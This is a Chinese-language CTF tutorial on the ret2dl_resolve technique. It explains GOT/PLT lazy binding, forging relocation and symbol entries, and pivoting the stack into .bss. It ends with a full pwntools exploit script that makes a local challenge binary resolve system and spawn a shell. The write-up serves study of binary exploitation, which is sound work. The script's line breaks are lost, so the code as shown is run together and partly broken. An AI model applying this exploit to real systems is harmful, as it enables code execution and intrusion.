原创： S3cana 合天智汇

要了解re2_dl_resolve，首先要弄清楚基础的got表和plt表

## got表 和 plt表  

plt表，过程链接表,过程链接表的作用是将位置无关的符号转移到绝对地址，当一个外部符号被调用的时候，PLT去引用GOT表中的符号对应的绝对地址。

首先我们看一下二进制文件中got表，以及plt表的位置,通过readelf我们可知,plt表的位置在0x8048360处，got表的位置在0x804a000的位置处（*）标记位置。

$ readelf -S dl_resolve [12] .plt PROGBITS 08048360（*） 000360 000040 04 AX 0 0
16 [24] .got.plt PROGBITS 0804a000（*） 001000 000018 04 WA 0 0 4

首先程序是call read@plt
<0x8048370>结合plt表的起始位置0x8048360以及偏移可知，0x8048370在plt表上，所以最开始是跳转到PLT表上

► 0x80484c5 <my_read+26> call read@plt <0x8048370> fd: 0x0 buf: 0xffffd56b ◂—
0xf7 nbytes: 0x1

当执行到要call read函数的时候，会跳转到 0x8048370处，反汇编代码如下

► 0x8048370 <read@plt> jmp dword ptr [_GLOBAL_OFFSET_TABLE_+12] <0x804a00c>
##注意这里，对应内容-> 第一次调用的时候0x804a00c处的位置的值 0x8048376 <read@plt+6> push 0
##地址0x8048370 处call read 的下一条指令 0x804837b <read@plt+11> jmp 0x8048360

我们可以看一下在第一次调用的时候0x804a00c处的位置的值，结合刚刚开始确定的got表的位置0x804a000可知,0x804a00c在got表上,查看一下0x804a00c处的值

gdb-peda$ x/1wx 0x804a00c0x804a00c: 0x08048376

我们可以看到在0x804a00c处的值为0x8048376,是地址0x8048370 处call
read的下一条指令的地址，那么程序会继续跳转回plt中继续执行0x8048376位置的指令,进而跳转到0x8048360处继续往下执行。

0x804837b <read@plt+11> jmp 0x8048360 ↓0x8048360 push dword ptr
[_GLOBAL_OFFSET_TABLE_+4<0x804a004>0x8048366 jmp dword ptr [0x804a008]
<0xf7fee000> ↓0xf7fee000 <_dl_runtime_resolve> push eax0xf7fee001
<_dl_runtime_resolve+1> push ecx

重点:注意从0x8048370到0x8048366的执行过程中这里有两次的压栈的操作,0x8048376处的push 0 以及
0x8048360处的push dword..，而ret2dl_resolve攻击，通过RETN EIP我们可以让程序直接return 到
0x8048360处执行，这样栈顶的元素也就是应该push入栈的第一个值，当我们伪造堆栈后，push
进入栈的第一个参数，也就是我们可以任意控制的了，这里传入的两个参数是将作为_dl_runtime_resolve解析函数的两个参数传入的，这样当我们伪造了其中的一个参数的时候，再通过构造假的节数据，使得_dl_runtime_resolve解析出我们想要的system函数，便可以实现
Return-to-dl-resolve 攻击。

0x804837b <read@plt+11> jmp 0x8048360 ↓0x8048360 push dword ptr
[_GLOBAL_OFFSET_TABLE_+4<0x804a004>0x8048366 jmp dword ptr [0x804a008]
<0xf7fee000> ↓0xf7fee000 <_dl_runtime_resolve> push eax0xf7fee001
<_dl_runtime_resolve+1> push ecx

为什么会执行_dl_runtime_resolve，因为当程序执行read的时候，会先查看got表，当程序第一次执行的时候，got表中存放的是
plt的jmp 对应的下一条指令的地址，这样将和jmp dword
ptr[GLOBAL_OFFSET_TABLE+12]对应起来，当程序第一次执行完read后
，通过_dl_runtime_resolve函数，会将解析出的read函数的地址写入got表中的对应的位置，下一次执行call read
函数的时候，便可以直接jmp 到read函数的真实地址，这一技术又被称作延迟绑定。具体的过程其实参考以上的过程可以基本理解。

当执行完第一次的read后，我们可以再次查看 0x804a00c位置处的值,如下，可以看到已经在got表中写入了read函数的真实地址0xf7ed7b00。

gdb-peda$ x/1wx 0x804a00c0x804a00c: 0xf7ed7b00

在https://rickgray.me/2015/08/07/use-gdb-to-study-got-and-plt/
博文中，文章最后展示的got表和plt表关系图很好的展示的是一个动态链接库函数printf的调用过程，可以参考理解，其实际的过程为

从plt表去查 got表 如果是第一次调用，此时在got表中写的是plt跳转的下一条指令的地址，则程序会执行到plt的下一条指令，然后继续执行，通过JMP
PLT[0]，会调用
_dl_runtime_resolve函数，将read的真实地址解析出来，然后写入got表中对应的位置。通过_dl_runtime_resove解析以后，程序会进入解析出的函数中执行。
如果不是第一次调用,那么在got表的相应的位置已经写入了该函数的真实的地址，则可以直接跳转到对应的函数执行。

综上我们可以知道，在plt表上，我们的程序是可以执行的代码，在got表上，我们写入的是函数的真实的地址，所以当我们劫持got表的时候(覆写got表),可以达到我们让程序执行我们指定函数的目的。

## 题目  

经过IDA后，题目如下：

int __cdecl main(int argc, const char **argv, const char **envp){ char v4; //
[esp+0h] [ebp-18h] setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0);
setvbuf(_bss_start, 0, 2, 0); my_read((int)&name, 0x1000); my_read((int)&v4,
0x18); return 0;}

my_read函数如下

ssize_t __cdecl my_read(int a1, int a2){ ssize_t result; // eax char buf; //
[esp+Bh] [ebp-Dh] int i; // [esp+Ch] [ebp-Ch] for ( i = 0; ; ++i ) { result =
i; if ( i >= a2 ) break; result = read(0, &buf, 1u); if ( result != 1 ) break;
if ( buf == 0xA ) { result = i + a1; *(_BYTE *)(i + a1) = 0; return result; }
*(_BYTE *)(a1 + i) = buf; } return result;}

## 题目中的溢出点  

通过gdb动态调试，可以知道在主main程序要retn时，会对新的栈顶重新赋值，如下0x8048583处的代码，而重新设置esp的值是可以被我们伪造的，这样我们就可以伪造新的堆栈了。

##首先我们动态调试main函数retn 位置处的代码，如下注释 ► 0x8048572 <main+107> call my_read
<0x80484ab> arg[0]: 0xffffd590 ◂— 0x1 arg[1]: 0x18 arg[2]: 0x2 arg[3]: 0x0
0x8048577 <main+112> add esp, 0x10 #提升堆栈 0x10 0x804857a <main+115> mov eax, 0
0x804857f <main+120> mov ecx, dword ptr [ebp - 4] #(这里是可覆盖的，由我们自己来定义值)
0x8048582 <main+123> leave #mov esp ebp ;pop ebp; 0x8048583 <main+124> lea
esp, [ecx - 4] # 这里将构造新的栈，我们选择在bss段上伪造我们新的堆栈，ecx的值来源于 [ebp-4],见0x804857f的代码，
0x8048586 <main+127> ret

## 栈中的构造  

由于 ecx的值来源于 [ebp-4]，那么我们只要能够在[ebp-4]的位置写入值，那么便可以构造我们自己的栈。

## 要在[ebp-4]的位置写入值，为什么能在 [ebp-4]的位置写入我们的值  

我们接着来看一下myread函数,myread函数是用来读取字符的在IDA中如下

my_read((int)&v4, 0x18);

该函数的目的是往第一个字符串的位置写入0x18长度的字符串,进一步查看一下V4的位置，在IDA中的识别为

char v4; // [esp+0h] [ebp-18h]

有的时候，IDA中的识别未必准确，可以通过gdb动态调试查看

► 0x804856c <main+101> push 0x18 0x804856e <main+103> lea eax, [ebp - 0x18]
0x8048571 <main+106> push eax 0x8048572 <main+107> call my_read <0x80484ab>

可以看到传入my_read的参数确实是[ebp-0x18],同时读入的字符串的长度也是0x18,通过上面对0x804857f以及
0x8048583地址的指令的分析，我们可以知道在[ebp-4]的位置处的值将是新的堆栈的位置，该处的值可被我们利用，使得我们可以伪造新的堆栈。那么新的堆栈的位置将在哪里？

## 新的堆栈的位置  

通过分析程序，我们可以知道程序最开始读入的name,在bss段，所以我们可以利用bss段构造我们的栈。

my_read((int)&name, 0x1000);

通过IDA查看，我们可以知道name
的位置在0x804A060的位置处，假如我们将新的栈的栈顶放在0x804A060的位置的时候，当程序使用该栈的时候，会将0x804A060之上的值覆盖，而在0x804A060之上有程序的其它变量，以及got表如果破坏了这些数据，可能会影响程序的运行。但是，再看
my_read可知，这次程序读入的字符串长度为0x1000,所以我们可以选择在&name+0x400或者&name+0x500的位置设置新的栈顶，这样也避免了破环程序中的有效数据。

## 新的esp在哪里赋值  

新的堆栈的位置可从如下代码知道

0x8048583 <main+124> lea esp, [ecx - 4]

假设我们的栈将要放在 &name+0x400的位置的时候，那么我们在[ebp-4]的位置写入的值应该为

&name+0x400+0x4

## 新的堆栈的构造  

在栈顶的位置，写入的是新的 retn
的值,该值将是我们retn的地址，从got表以及plt表的前置知识，我们可以了解到我们retn的位置应该是0x8048360的位置处，所以伪造的栈顶的位置处的值为0x8048360，在0x8048360的下面应该是push进入栈的第一个参数，reloc_index,在reloc_index下面是return
的返回值，然是是我们的传入 _dl_runtime_resolve函数要解析的函数的参数的位置的值

我们将伪造的栈如下

.........&name+0x4000x8048360return地址&name+0x404reloc_indexpush
0的伪造参数&name+0x408start_address起始地址&name+0x40Cbss_addr + 12 * 4/bin/sh字符串的地址

这将构成第一段payload的一部分

32 payload1 = 'a' * 0x400 33 payload1 += p32(plt_addr) 34 payload1 +=
p32(index_arg) 35 payload1 += p32(0x80483B0) + p32(bss_add + 12*4)

接下来，我们是通过伪造节，使得_dl_runtime_resolve 来解析system，从而进入system来解析执行，从而实现root权限的获取。

## 伪造节以及利用  

我们首先来看一下 _dl_runtime_resolve的解析的过程,在_dl_runtime_resolve中，我们可以传入两个参数link_map和
reloc_index

  1. 程序通过link_map会得到 .dynstr、.dynsym、.rel.plt的地址，这里得到的地址不可以伪造  

  2. rel.plt + reloc_index(该值可以伪造),也就可以求出当前函数的重定位表项Elf32_Rel的指针，记作 rel（rel是我们将要伪造的）  

  3. rel->r_info >> 8 可以作为 .dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym(sym是我们将要伪造的)  

  4. .dynstr +( sym -> st_name) 能够得到 符号名称字符串指针(st_name 是个偏移值)(st_name是我们伪造的system的偏移地址)  

  5. 再在动态链接库中查找这个函数的地址，并把地址赋值给 *rel->offset ，即got表  

  6. 最后调用这个函数  

实际利用思路

我们已知 reloc_index是可控的(reloc_index为push 0的那个参数)，reloc_index可控，结合第2步可知，我们可以控制rel
的落点位置,进而可推导出我们可以控制 rel->r_info >> 8(结合3)，也就是说
.dynsym的下标可控，那么我们进一步也就可以控制sym的位置了，sym是我们可控的，最后那么我们便可以控制 .dynstr + sym ->
得到的st_name。从而实现最终的我们想要的解析效果。

首先控制 reloc_index 使得 rel 落到我们可以控制的区域，这样我们就可以使得 sym 落到我们可以控制的区域了，再进一步我们可以控制的就是
查找的字符串了，其中字符串是通过 sym-> st_name 得到的偏移加上 .dynstr的地址得到的。

//假设可以伪造的地址为 bss_addr//reloc_index = bss_addr - .rel.plt // 这个位置存储的将是
rel,在这里伪造 假的rel

rel的数据结构描述如下

typedef struct{ Elf32_Addr r_offset; /* Address */ Elf32_Word r_info; /*
Relocation type and symbol index */} Elf32_Rel;//el.plt 中的offset 对应着r_offset
是函数在.got.plt表中的位置, Info对应着r_info的高24位，Type对应着r_info的低8位 #define
ELF32_R_SYM(info) ((info)>>8) #符号在符号表中的索引，占r_offset的高24位#define
ELF32_R_TYPE(info) ((unsigned char)(info))重定位类型 占r_offset的低8位#define
ELF32_R_INFO(sym, type) (((sym)<<8)+(unsigned char)(type))

也就是说构造ELF32_Rel,其中 Elf32_Addr 的原始类型为 uint32_t 是4字节的，Elf32_Word是32位版本
int32_t也是4字节的。在伪造地址构造完 rel后，在r_info的位置要构造 .dynsym
的下标,该处仍然应该是我们要伪造的地址sym,其中sym的数据结构如下

typedef struct{ Elf32_Word st_name; /* Symbol name (string tbl index) */
Elf32_Addr st_value; /* Symbol value */ Elf32_Word st_size; /* Symbol size */
unsigned char st_info; /* Symbol type and binding */ unsigned char st_other;
/* Symbol visibility */ Elf32_Section st_shndx; /* Section index */}
Elf32_Sym///已知sym,以及dynsym 求下标，应该是下标: (sym_addr - dynsym)/0x10 #TODO: 这里为什么是
除以0x10 因为在dynsym的位置处，是按照0x10来处理的，每0x10作为一个数组

再次伪造 sym 将sym 中的st_name 的偏移设置为system的偏移，当通过.dynstr +( sym ->
st_name)来解析出的就是system的函数地址。

## 求解步骤  

通过以上的解析过程，我们可以按照如下思路求解

  1. fake_rel_addr = name_addr + 0x500 # fake_rel_addr 是 我们伪造的 rel，通过.rel.plt + reloc_index将解析到fake_rel_addr  

  2. reloc_index = fake_rel_addr - rel_addr # 求 reloc_index  

  3. r_info = (fake_sym_addr - .dynsym)/0x10 << 8 (这里左移8位是因为在计算的时候要向右移动8 位造成的),其中 fake_sym_addr = fake_rel_addr + 4 * 4  

  4. 伪造 st_name = (fake_rel_addr + 8 + 24 ) - dynstr_addr  

  5. 通过以上4步可以构造好伪造的 数据!!!  

假设将 fake_sym 设置在0x804a060 + 0x500 的位置,排列顺序为

![v2-c34b949413ca941ef1f965cd8832ec68_hd.j](https://pic4.zhimg.com/80/v2-c34b949413ca941ef1f965cd8832ec68_hd.jpg)

最终可以得到解题脚本如下

from pwn import *rel_plt = 0x8048324padding = 0x500stack = 0x100bss_add =
0x804A060 + padding index_arg = bss_add - rel_pltdynsym = 0x80481dcn =
(bss_add+ 4*4 - dynsym)/0x10fake_system_addr = bss_addr_info = n << 8r_info +=
7dynstr = 0x804826cst_name = (bss_add + 8 + 24 - dynstr)print("st_name is
%x",hex(st_name))plt_addr = 0x8048360print("r_info is",hex(r_info))payload1 =
'a' * 0x400 payload1 += p32(plt_addr) payload1 += p32(index_arg) payload1 +=
p32(0x80483B0) + p32(bss_add + 12*4) # + p32(0x804a00c) 这里的12*4 的指向就是 /bin/sh
当通过 _dl_runtime_resolve来实现的payload1 += 'a' * (0x100-0x10)payload1 +=
p32(0x804a00c)payload1 += p32(r_info)payload1 += p32(st_name) * 2payload1 +=
p32(0) payload1 += p32(0x00000012)*3payload1 += 'system\x00\x00'payload1 +=
'system\x00\x00'payload1 += '/bin/bash\x00'context.log_level =
'debug'context.terminal = ['tmux','splitw','-h']elf =
ELF('./dl_resolve')bss_addr = 0x804A060+4+ 0x400p =
process('./dl_resolve')payload = 'a' * 20payload +=
p32(bss_addr)p.sendline(payload1)p.sendline(payload)p.interactive()

## 要注意的点  

注意点

  1. 堆栈不能放太高，将堆栈放到了0x804A060的位置，过于高了，会导致_dl_run_time解析的时候，堆栈覆盖了got表。  

  2. 当通过_dl_runtime_resolve解析后，程序会进入到解析的地址执行，并从栈上取参数。解析完后，会将真实的函数地址写入got表中。  

  3. 首先说第一个参数，[0x804a004]是一个link_map的指针，它包含了.dynamic的指针，通过这个link_map，_dl_runtime_resolve函数可以访到.dynamic这个section  

## 文章参考  

<https://rickgray.me/2015/08/07/use-gdb-to-study-got-and-plt/>

<https://bbs.pediy.com/thread-227034.htm>

[Return to dl resolve浅析](https://www.secpulse.com/archives/71169.html)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

